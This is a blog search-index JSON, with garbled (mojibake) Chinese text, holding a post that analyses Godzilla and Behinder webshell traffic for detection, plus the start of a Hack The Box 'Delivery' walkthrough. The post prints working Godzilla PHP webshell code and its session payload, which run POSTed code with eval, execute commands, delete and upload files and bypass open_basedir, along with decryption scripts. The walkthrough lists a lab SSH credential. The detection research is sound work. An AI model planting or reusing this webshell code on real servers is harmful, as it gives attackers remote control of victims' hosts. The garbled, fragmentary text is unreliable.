ç‰ˆçš„ shell å±•å¼€ï¼Œå¯¹å…¶è¿è¡ŒåŸç†å†åšä¸€ä¸‹æ€»ç»“å’Œé˜è¿°ã€‚é¦–å…ˆï¼Œç”Ÿæˆä¸€ä¸ª php é™æ€ webshellï¼ŒåŠ å¯†å™¨é€‰æ‹© PHP_XOR_BASE64ã€‚ ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:1:0","tags":["æ¸—é€æµ‹è¯•"],"title":"webshell æµé‡åˆ†æ","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.1 HTTP è¯·æ±‚å¤´ç‰¹å¾ 1.1.1 User-Agent å“¥æ–¯æ‹‰å®¢æˆ·ç«¯ä½¿ç”¨ JAVA è¯­è¨€ç¼–å†™ï¼Œåœ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä¸ä¿®æ”¹ User-Agentï¼ŒUser-Agent ä¼šç±»ä¼¼äº Java/11.0.7ï¼ˆå…·ä½“ä»€ä¹ˆç‰ˆæœ¬å–å†³äº JDK ç¯å¢ƒç‰ˆæœ¬ï¼‰ã€‚ä½†æ˜¯å“¥æ–¯æ‹‰æ”¯æŒè‡ªå®šä¹‰ HTTP å¤´éƒ¨ï¼Œè¿™ä¸ªé»˜è®¤ç‰¹å¾æ˜¯å¯ä»¥å¾ˆå®¹æ˜“å»é™¤çš„ã€‚ 1.1.2 Accept Accept å¤´ä¸º text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 å¯¹è¿™ä¸ªé»˜è®¤ç‰¹å¾åº”è¯¥å¾ˆç†Ÿæ‚‰äº†ï¼Œä¹‹å‰å†°èä¹Ÿå‡ºç°è¿‡åŒæ ·çš„ Acceptã€‚ä¸ºä»€ä¹ˆä¼šè¿™ä¹ˆå·§åˆå‡ºç°ä¸¤ä¸ªå·¥å…·éƒ½ä¼šå‡ºç°è¿™ä¸ªç‰¹å¾å‘¢ï¼Œå…¶å®è¿™ä¸ªä¹Ÿæ˜¯ JDK å¼•å…¥çš„ä¸€ä¸ªç‰¹å¾ï¼Œå¹¶ä¸æ˜¯ä½œè€…è‡ªå®šä¹‰çš„ Acceptã€‚åŒæ ·çš„è¿™ä¸ªé»˜è®¤ç‰¹å¾ä¹Ÿå¯ä»¥é€šè¿‡è‡ªå®šä¹‰å¤´éƒ¨å»é™¤ï¼Œåªèƒ½ä½œä¸ºé»˜è®¤æƒ…å†µä¸‹çš„è¾…åŠ©æ£€æµ‹ç‰¹å¾ã€‚ ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:1:1","tags":["æ¸—é€æµ‹è¯•"],"title":"webshell æµé‡åˆ†æ","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.2 è¯·æ±‚ä½“ç‰¹å¾ 1.2.1 PHP_XOR_BASE64 ä»¥é»˜è®¤ shell çš„å¯†ç å’Œå¯†é’¥ä¸ºä¾‹ï¼Œç”Ÿæˆçš„æ–‡ä»¶å¦‚ä¸‹ï¼š \u003c?php session_start(); @set_time_limit(0); @error_reporting(0); function E($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $D[$i] = $D[$i]^$K[$i+1\u002615]; } return $D; } function Q($D){ return base64_encode($D); } function O($D){ return base64_decode($D); } $P='pass'; $V='payload'; $T='3c6e0b8a9c15224a'; // md5(key)[:16] if (isset($_POST[$P])){ $F=O(E(O($_POST[$P]),$T)); if (isset($_SESSION[$V])){ $L=$_SESSION[$V]; $A=explode('|',$L); class C{public function nvoke($p) {eval($p.\"\");}} $R=new C(); $R-\u003envoke($A[0]); echo substr(md5($P.$T),0,16); echo Q(E(@run($F),$T)); echo substr(md5($P.$T),16); }else{ $_SESSION[$V]=$F; } } å…¶ä¸­æ¯”è¾ƒæ ¸å¿ƒçš„åœ°æ–¹æœ‰ä¸¤å¤„ï¼Œç¬¬ä¸€å¤„æ˜¯è¿›è¡Œå¼‚æˆ–åŠ å¯†å’Œè§£å¯†çš„å‡½æ•° E($D,$K)ï¼Œç¬¬äºŒå¤„æ˜¯åµŒå¥—çš„ä¸¤ä¸ª if å¯¹å“¥æ–¯æ‹‰å®¢æˆ·ç«¯ä¸Šä¼ çš„ä»£ç åšæ‰§è¡Œå¹¶å¾—åˆ°ç»“æœã€‚ æ ¹æ® $F=O(E(O($_POST[$P]),$T));ç¬¬ 21 è¡Œåšé€†å‘åˆ¤æ–­ï¼Œå¯ä»¥å¾—åˆ°å“¥æ–¯æ‹‰å®¢æˆ·ç«¯ä¸Šä¼ ä»£ç æ—¶çš„ç¼–ç åŠ å¯†è¿‡ç¨‹ï¼š åŸå§‹ä»£ç  -\u003e Base64 ç¼–ç  -\u003e E å‡½æ•°è¿›è¡Œå¼‚æˆ–åŠ å¯† -\u003e å† Base64 ç¼–ç  è¿›å…¥ç¬¬äºŒä¸ª if è¯­å¥ï¼Œé¦–å…ˆåˆ¤æ–­ $_SESSION[$V] æ˜¯å¦å­˜åœ¨ï¼Œå®¢æˆ·ç«¯é¦–æ¬¡è¿æ¥ shell æ—¶ä¼šåœ¨ $_SESSION ä¸­ä¿å­˜ä¸€æ®µä»£ç ï¼Œå« payloadã€‚ç»“åˆåé¢ çš„run å‡½æ•°ï¼Œè¿™ä¸ª payload åœ¨åç»­ shell è¿æ¥è¿‡ç¨‹ä¸­ä¼šè¢«è°ƒç”¨ã€‚æ•´ä¸ª shell çš„è¿è¡ŒåŸç†åˆ°è¿™é‡ŒåŸºæœ¬å°±èƒ½æ˜ç¡®äº†ï¼Œå¯ä»¥ç”¨ä¸€ç¯‡æ–‡ç« ä¸­çš„æµç¨‹å›¾æ¥æ€»ç»“ï¼š åœ¨å®¢æˆ·ç«¯ä¸Šé…ç½®ä»£ç†ï¼Œåˆ©ç”¨ Burp æŸ¥çœ‹ä¸‹ webshell çš„äº¤äº’æµé‡ã€‚ åœ¨å®¢æˆ·ç«¯é¦–æ¬¡è¿æ¥æ—¶ï¼Œä¼šæœ‰è¿ç»­ä¸‰ä¸ªè¯·æ±‚ï¼Œç¬¬ä¸€ä¸ªè¯·æ±‚å¦‚ä¸‹ï¼š æ ¹æ®ä¸Šè¿°åˆ†æçš„åŠ å¯†åŸç†ï¼Œå¯ä»¥å†™ä¸€ä¸ªç®€å•çš„è§£å¯†è„šæœ¬ï¼Œå°† pass æ•°æ®è¿›è¡Œè§£å¯†ï¼š \u003c?php function E($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $D[$i] = $D[$i]^$K[$i+1\u002615]; } return $D; } function O($D){ return base64_decode($D); } $P='pass'; $V='payload'; $T='3c6e0b8a9c15224a'; // md5(key)[:16] echo O(E(O(\"è¦è§£å¯†çš„æ•°æ®\"), $T)); ?\u003e è§£å¯†å¾—åˆ°çš„æ•°æ®ä¸ºï¼š \u003c?php $parameters=array(); function run($pms){ formatParameter($pms.'\u0026ILikeYou='.base64Encode('metoo')); if ($_SESSION[\"bypass_open_basedir\"]==true){ @bypass_open_basedir(); } return base64Encode(evalFunc()); } function bypass_open_basedir(){ // ... } function formatParameter($pms){ global $parameters; $pms=explode(\"\u0026\",$pms); foreach ($pms as $kv){ $kv=explode(\"=\",$kv); if (sizeof($kv)\u003e=2){ $parameters[$kv[0]]=base64Decode($kv[1]); } } } function evalFunc(){ @session_write_close(); $className=get(\"codeName\"); $methodName=get(\"methodName\"); if ($methodName!=null){ if (strlen(trim($className))\u003e0){ if ($methodName==\"includeCode\"){ return includeCode(); }else{ if (isset($_SESSION[$className])){ return eval($_SESSION[$className]); }else{ return \"{$className} no load\"; } } }else{ return $methodName(); } }else{ return \"methodName Is Null\"; } } function deleteDir($p){ $m=@dir($p); while(@$f=$m-\u003eread()){ $pf=$p.\"/\".$f; @chmod($pf,0777); if((is_dir($pf))\u0026\u0026($f!=\".\")\u0026\u0026($f!=\"..\")){ deleteDir($pf); @rmdir($pf); }else if (is_file($pf)\u0026\u0026($f!=\".\")\u0026\u0026($f!=\"..\")){ @unlink($pf); } } $m-\u003eclose(); @chmod($p,0777); return @rmdir($p); } function deleteFile(){ $F=get(\"fileName\"); if(is_dir($F)){ return deleteDir($F)?\"ok\":\"fail\"; }else{ return (file_exists($F)?@unlink($F)?\"ok\":\"fail\":\"fail\"); } } function copyFile(){ $srcFileName=get(\"srcFileName\"); $destFileName=get(\"destFileName\"); if (@is_file($srcFileName)){ if (copy($srcFileName,$destFileName)){ return \"ok\"; }else{ return \"fail\"; } }else{ return \"The target does not exist or is not a file\"; } } function moveFile(){ $srcFileName=get(\"srcFileName\"); $destFileName=get(\"destFileName\"); if (rename($srcFileName,$destFileName)){ return \"ok\"; }else{ return \"fail\"; } } function getBasicsInfo() { //... } function getFile(){ // ... } function readFileContent(){ $fileName=get(\"fileName\"); if (@is_file($fileName)){ if (@is_readable($fileName)){ return file_get_contents($fileName); }else{ return \"No Permission!\"; } }else{ return \"File Not Found\"; } } function uploadFile(){ $fileName=get(\"fileName\"); $fileValue=get(\"fileValue\"); if (@file_put_contents($fileName,$fileValue)!==false){ return \"ok\"; }else{ return \"fail\"; } } function newDir(){ $dir=get(\"dirName\"); if (@mkdir($dir,0777,true)!==false){ return \"ok\"; }else{ return \"fail\"; } } function newFile(){ $fileName=get(\"fileName\"); if (@file_put_contents($fileName,\"\")!==false){ return \"ok\"; }else{ return \"fail\"; } } function execCommand(){ $result = \"\"; $command = get(\"cmdLine\"); $PadtJn = @ini_get('disable_functions'); if (! empty($PadtJn)) { $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn); $PadtJn = ex","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:1:2","tags":["æ¸—é€æµ‹è¯•"],"title":"webshell æµé‡åˆ†æ","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 å†°è åŒæ ·ä»¥ PHP webshell ä¸ºä¾‹ï¼Œä½¿ç”¨å†°èé»˜è®¤çš„ webshellï¼Œå¹¶è¿›è¡Œæµ‹è¯•ã€‚ ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:2:0","tags":["æ¸—é€æµ‹è¯•"],"title":"webshell æµé‡åˆ†æ","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 HTTP è¯·æ±‚å¤´ç‰¹å¾ 2.1.1 User-Agent è¯¥ç‰¹å¾å±äºå¼±ç‰¹å¾ã€‚æ™®é€šç”¨æˆ·å¾ˆå®¹æ˜“å°±å¯ä»¥ä¿®æ”¹ã€‚ä½†æ˜¯æˆ‘ä»¬ä¹Ÿåˆ†æä¸€ä¸‹ã€‚ å†°è 3.0 æ¯æ¬¡è¯·æ±‚éƒ½ä¼šéšæœºé€‰æ‹©ä¸€ä¸ª User-Agentã€‚ä½†æ˜¯å¦‚æœç”¨æˆ·é»˜è®¤ä¸æä¾› UA å¤´ï¼Œåˆ™ä»ç³»ç»Ÿä¸­éšæœºé€‰æ‹©ä¸€ä¸ª UA å¤´ã€‚åœ¨æœ€æ–°ç‰ˆæœ¬(v3.0 Beta 6)ä¸­çš„å†°èæºç ä¸­ï¼Œå­˜åœ¨å¦‚ä¸‹ User-Agent { \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1\", \"Mozilla/5.0 (iPad; CPU OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1\", \"Mozilla/5.0 (iPod; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1\", \"Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36\", \"Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/84.0.4147.122 Mobile/15E148 Safari/604.1\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (X11; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0\", \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\", \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\", \"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko\", \"Mozilla/5.0 (Windows NT 6.2; Trident/7.0; rv:11.0) like Gecko\", \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\" } 2.1.2 Accept \u0026\u0026 Accept-Language åœ¨ ShellService.java ä¸­å‘ç°é¢„å…ˆè®¾ç½®çš„ Accept å’Œ Accept-Languageï¼š ä¸ºå›ºå®šå€¼ï¼ŒåŒæ—¶ï¼Œå¦‚æœ webshell ä¸º php ç±»å‹ï¼Œä¼šè®¾å®š Content-Type å€¼ä¹Ÿä¸ºä¸€ä¸ªå›ºå®šå€¼ï¼štext/html;charset=utf-8ã€‚ åœ¨ç”¨æˆ·æœªæ›´æ”¹é»˜è®¤é…ç½®çš„æƒ…å†µä¸‹ï¼Œä¸Šè¿°ç‰¹å¾å¯ä»¥ä½œä¸ºæ£€æµ‹çš„ä¸€ä¸ªæ–¹å‘ã€‚ ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:2:1","tags":["æ¸—é€æµ‹è¯•"],"title":"webshell æµé‡åˆ†æ","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 HTTP è¯·æ±‚ä½“ç‰¹å¾ æ ¹æ® webshell çš„å†…å®¹ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤ç§è§£å¯†æ–¹å¼ï¼š å½“ç›®æ ‡æœåŠ¡å™¨æœªå¼€å¯ openssl æ—¶ï¼Œé‡‡ç”¨å¼‚æˆ–çš„æ–¹å¼åŠ å¯† å½“ç›®æ ‡æœåŠ¡å™¨å¼€å¯ openssl æ—¶ï¼Œé‡‡ç”¨ AES-128 æ–¹å¼åŠ å¯† è§£å¯†è„šæœ¬ï¼š \u003c?php $key=\"e45e329feb5d925b\"; $post = \"å¾…è§£å¯†çš„å†…å®¹\"; $post = openssl_decrypt($post, \"AES128\", $key); echo $post; ?\u003e è¿æ¥ shell æ—¶çš„ç¬¬ä¸€æ¡æ•°æ®åŒ…ï¼š è§£å¯†å‡ºè¿æ¥ shell æ—¶çš„ç¬¬ä¸€æ¡æ•°æ®ï¼š è¿›ä¸€æ­¥ base64 è§£å¯†å¾—åˆ°ä¼ è¾“çš„å†…å®¹ï¼š \u003c?php @error_reporting(0); function main($content) { $result = array(); $result[\"status\"] = base64_encode(\"success\"); $result[\"msg\"] = base64_encode($content); $key = $_SESSION['k']; echo encrypt(json_encode($result),$key); } function encrypt($data,$key) { if(!extension_loaded('openssl')) { for($i=0;$i\u003cstrlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1\u002615]; } return $data; } else { return openssl_encrypt($data, \"AES128\", $key); } }$content=\"qing73XL3NTszHHme5YqeWHi79mSMZaUuubbtH7I65qSGoUqfzFvnD2TW\"; main($content); ?\u003e ä»ä¸Šè¿°è„šæœ¬å¯ä»¥åˆ†æåˆ°ï¼Œå›åŒ…ä¹Ÿæ˜¯ç”¨ AES-128 è¿›è¡ŒåŠ å¯†ï¼š ç¬¬äºŒæ¡æ•°æ®åŒ…ï¼š è§£å¯†è¯·æ±‚ï¼š base64 è§£å¯†ï¼š \u003c?php error_reporting(0); function main($whatever) { ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean(); $driveList =\"\"; if (stristr(PHP_OS,\"windows\")||stristr(PHP_OS,\"winnt\")) { for($i=65;$i\u003c=90;$i++) { $drive=chr($i).':/'; file_exists($drive) ? $driveList=$driveList.$drive.\";\":''; } } else { $driveList=\"/\"; } $currentPath=getcwd(); //echo \"phpinfo=\".$info.\"\\n\".\"currentPath=\".$currentPath.\"\\n\".\"driveList=\".$driveList; $osInfo=PHP_OS; $result=array(\"basicInfo\"=\u003ebase64_encode($info),\"driveList\"=\u003ebase64_encode($driveList),\"currentPath\"=\u003ebase64_encode($currentPath),\"osInfo\"=\u003ebase64_encode($osInfo)); //echo json_encode($result); session_start(); $key=$_SESSION['k']; //echo json_encode($result); //echo openssl_encrypt(json_encode($result), \"AES128\", $key); echo encrypt(json_encode($result), $key); } function encrypt($data,$key) { if(!extension_loaded('openssl')) { for($i=0;$i\u003cstrlen($data);$i++) { $data[$i] = $data[$i]^$key[$i+1\u002615]; } return $data; } else { return openssl_encrypt($data, \"AES128\", $key); } }$whatever=\"yXC5t2ZpMa4Mj6zCgAXVLhQX5TFoNnjDYke36m2uCtHecRRdxqlbd2AudDH33CNWx41ISHqaJb4PfWbWp3CHTGAfUvFl1x5abikyEbCXL9TPQX5Mhuvjv45zhYNMxvb38UtH2BdLpiGpLFMMXqaNkmIVTEAj3opuUN4sE3wKMryeCAvVgDKwoBGf0YAduvy2vvxvQMXEIPTSB1Blp9fcvzMGyM3Qca0FsYwYwyp2wNj7DDDYmJnvmqF547rTfhgH3NnSlpR7rjG1UorFkZPxrITQuuGkz7dV2JuVVFCKtw8VVl8zGjLGyznpu4yHCChEMxE9YszxTWgowBPURYvMuLyf6YIhJBRl86DcJsWKsaGG9OFwA2t5vcTnHdEO5yRUjRjGCk6P3MfnlqpklSjjrf5lgisxjnvFNBerwYSNWZCMQ56xW2vwNqSZ4iEj0Kg1TBMIBRdnCpc46VE6iVLe34bqx6sXhhXzK0KLnbQ8kDAlLXuJAP87XlZPCVB4zp0eStqoVIHYUTIDhkJ4rH06z1JumGfbT21MQj64CH1PBkHvfOTCkkxXQN8EXZerxZ831SeVRGv37PbNu\"; main($whatever); ?\u003e å¾—åˆ°å…·ä½“æ‰§è¡Œçš„å†…å®¹å³è·å–åŸºæœ¬ä¿¡æ¯ã€‚ å¯¹å›åŒ…çš„è§£å¯†è¿‡ç¨‹åŒä¸Šï¼Œæœ€åå¯ä»¥å¾—åˆ°ä¸€ä¸ª JSON å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«ç›¸åº”çš„ä¿¡æ¯ã€‚ { \"basicInfo\": \"......\", \"driveList\": \"Lw==\", \"currentPath\": \"L2hvbWUvZGFlL3BocA==\", \"osInfo\": \"TGludXg=\" } ","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:2:2","tags":["æ¸—é€æµ‹è¯•"],"title":"webshell æµé‡åˆ†æ","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3 åç»­è¡¥å…… Godzilla æ›´æ–°äº† webshell çš„é€»è¾‘ï¼ŒåŠ å¯†æ­¥éª¤æœ‰ä¸€ç‚¹å˜åŒ–ï¼š æ•°æ®åœ¨å‘é€æ—¶ï¼Œç»è¿‡ encode + base64 ä¸¤å±‚åŠ å¯†ï¼Œè§£å¯†ä»£ç å¦‚ä¸‹ï¼š \u003c?php $pass='pass'; $payloadName='payload'; $key='3c6e0b8a9c15224a'; function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $data=encode(base64_decode(\"\",$key)); echo $data; ?\u003e æ•°æ®åœ¨æ¥æ”¶æ—¶ï¼Œé™¤äº†é‡‡ç”¨å‰ 16 ä½å’Œå 16 ä¸ºçš„å¹²æ‰°å­—ç¬¦å¤–ï¼Œå†…å®¹é‡‡ç”¨ gzip å‹ç¼©ç¼–ç  + å¼‚æˆ– + base64ï¼Œè§£å¯†ä»£ç å¦‚ä¸‹ï¼š \u003c?php function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } function gzdecode($data) { return gzinflate(substr($data,10,-8)); } $pass='pass'; $payloadName='payload'; $key='3c6e0b8a9c15224a'; $data=gzdecode(encode(base64_decode(\"\"),$key)); echo $data; ?\u003e é™„ï¼šsession ä¸­å­˜å‚¨çš„ä»£ç ï¼š \u003c?php $parameters=array(); $_SES=array(); function run($pms){ reDefSystemFunc(); $_SES=\u0026getSession(); @session_start(); $sessioId=md5(session_id()); if (isset($_SESSION[$sessioId])){ $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId))); } @session_write_close(); if (canCallGzipDecode()==1\u0026\u0026@isGzipStream($pms)){ $pms=gzdecode($pms); } formatParameter($pms); if (isset($_SES[\"bypass_open_basedir\"])\u0026\u0026$_SES[\"bypass_open_basedir\"]==true){ @bypass_open_basedir(); } $result=evalFunc(); if ($_SES!==null){ session_start(); $_SESSION[$sessioId]=base64_encode(S1MiwYYr(serialize($_SES),$sessioId)); @session_write_close(); } if (canCallGzipEncode()){ $result=gzencode($result,6); } return $result; } function S1MiwYYr($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $D[$i] = $D[$i]^$K[($i+1)%15]; } return $D; } function reDefSystemFunc(){ if (!function_exists(\"file_get_contents\")) { function file_get_contents($file) { $f = @fopen($file,\"rb\"); $contents = false; if ($f) { do { $contents .= fgets($f); } while (!feof($f)); } fclose($f); return $contents; } } if (!function_exists('gzdecode')\u0026\u0026function_existsEx(\"gzinflate\")) { function gzdecode($data) { return gzinflate(substr($data,10,-8)); } } } function \u0026getSession(){ global $_SES; return $_SES; } function bypass_open_basedir(){ @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']); $allFiles = @scandir($_FILENAME); $cdStatus=false; if ($allFiles!=null){ foreach ($allFiles as $fileName) { if ($fileName!=\".\"\u0026\u0026$fileName!=\"..\"){ if (@is_dir($fileName)){ if (@chdir($fileName)===true){ $cdStatus=true; break; } } } } } if(!@file_exists('bypass_open_basedir')\u0026\u0026!$cdStatus){ @mkdir('bypass_open_basedir'); } if (!$cdStatus){ @chdir('bypass_open_basedir'); } @ini_set('open_basedir','..'); @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']); @$_path = str_replace(\"\\\\\",'/',$_FILENAME); @$_num = substr_count($_path,'/') + 1; $_i = 0; while($_i \u003c $_num){ @chdir('..'); $_i++; } @ini_set('open_basedir','/'); if (!$cdStatus){ @rmdir($_FILENAME.'/'.'bypass_open_basedir'); } } function formatParameter($pms){ global $parameters; $index=0; $key=null; while (true){ $q=$pms[$index]; if (ord($q)==0x02){ $len=bytesToInteger(getBytes(substr($pms,$index+1,4)),0); $index+=4; $value=substr($pms,$index+1,$len); $index+=$len; $parameters[$key]=$value; $key=null; }else{ $key.=$q; } $index++; if ($index\u003estrlen($pms)-1){ break; } } } function evalFunc(){ try{ @session_write_close(); $className=get(\"codeName\"); $methodName=get(\"methodName\"); $_SES=\u0026getSession(); if ($methodName!=null){ if (strlen(trim($className))\u003e0){ if ($methodName==\"includeCode\"){ return includeCode(); }else{ if (isset($_SES[$className])){ return eval($_SES[$className]); }else{ return \"{$className} no load\"; } } }else{ if (function_exists($methodName)){ return $methodName(); }else{ return \"function {$methodName} not exist\"; } } }else{ return \"methodName Is Null\"; } }catch (Exception $e){ return \"ERROR://\".$e -\u003e getMessage(); } } function deleteDir($p){ $m=@dir($p); while(@$f=$m-\u003eread()){ $pf=$p.\"/\".$f; @chmod($pf,0777); if((is_dir($pf))\u0026\u0026($f!=\".\")\u0026\u0026($f!=\"..\")){ deleteDir($pf); @rmdir($pf); }else if (is_file($pf)\u0026\u0026($f!=\".\")\u0026\u0026($f!=\"..\")){ @unlink($pf); } } $m-\u003eclose(); @chmod($p,0777); return @rmdir($p); } function deleteFile(){ $F=get(\"fileName\");","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:3:0","tags":["æ¸—é€æµ‹è¯•"],"title":"webshell æµé‡åˆ†æ","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["é¶åœº"],"content":"Hack the box - Delivery","date":"2021-03-22","objectID":"/2021/03/hackthebox-delivery/","tags":["HTB"],"title":"Hack the box - Delivery","uri":"/2021/03/hackthebox-delivery/"},{"categories":["é¶åœº"],"content":"Hack The Box - Delivery ","date":"2021-03-22","objectID":"/2021/03/hackthebox-delivery/:0:0","tags":["HTB"],"title":"Hack the box - Delivery","uri":"/2021/03/hackthebox-delivery/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æ”¶é›† nmap -T4 -A 10.10.10.222 ç›®æ ‡æœºå™¨å¼€æ”¾ 22ã€80 ç­‰ç«¯å£ã€‚ è®¿é—® 80 ç«¯å£ï¼Œç‚¹å‡» CONTACT USï¼š è¯¥é¡µé¢å‘ç°ä¸¤å¤„åŸŸåï¼šhelpdesk.delivery.htb å’Œ delivery.htb å°†ä¸Šè¿°ä¸¤ä¸ªåŸŸåæ·»åŠ åˆ° hosts æ–‡ä»¶ä¸­ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥æµ‹è¯•ã€‚ ","date":"2021-03-22","objectID":"/2021/03/hackthebox-delivery/:1:0","tags":["HTB"],"title":"Hack the box - Delivery","uri":"/2021/03/hackthebox-delivery/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ http://helpdesk.delivery.htb/index.php ä¸Šæ–°å»ºä¸€ä¸ªå·¥å•ï¼š å¾—åˆ°ä¸€ä¸ªé‚®ç®±å’Œå·¥å• IDã€‚ åˆ©ç”¨è¯¥é‚®ç®±ï¼Œåœ¨ http://delivery.htb:8065/signup_email æ³¨å†Œè´¦å·ï¼š åˆ›å»ºè´¦æˆ·åï¼Œå‘ç°éœ€è¦é‚®ç®±éªŒè¯ï¼Œä½†æ˜¯ç›®å‰æ— æ³•è·å–åˆ°æ³¨å†Œè®¤è¯çš„é“¾æ¥ã€‚ åœ¨ helpdesk.delivery.htb ä¸Šå­˜åœ¨ä¸€ä¸ªæŸ¥çœ‹å†å²å·¥å•çš„é“¾æ¥ï¼Œç„¶ååœ¨ Check Ticket Status ä¸­æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼š å‘ç°è®¤è¯é“¾æ¥è¢«å‘é€åˆ°æ­¤å¤„ï¼Œç‚¹å‡»è¯¥é“¾æ¥ï¼Œè¿›è¡Œè´¦æˆ·ç¡®è®¤ï¼Œå¹¶ç™»å½•åå°ï¼š åœ¨åå°å¤„å‘ç° Server çš„ç”¨æˆ·åå’Œå¯†ç  maildeliverer:Youve_G0t_Mail! å’Œç®¡ç†å‘˜ç•™ä¸‹çš„å¯†ç è§„åˆ™ï¼šPleaseSubscribe! SSH ç™»å½•ï¼š è·å¾— user çš„ flagã€‚ åœ¨ /opt/mattermost/config/ ä¸‹æ‰¾åˆ°åº”ç”¨çš„ config æ–‡ä»¶ï¼š åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ° mysql çš„ç”¨æˆ·åä¸å¯†ç ï¼š ç™»å½• mysqlï¼Œå¯»æ‰¾æ•æ„Ÿä¿¡æ¯ï¼š å‘ç° web åº”ç”¨ä¸­ root ç”¨æˆ·çš„å¯†ç  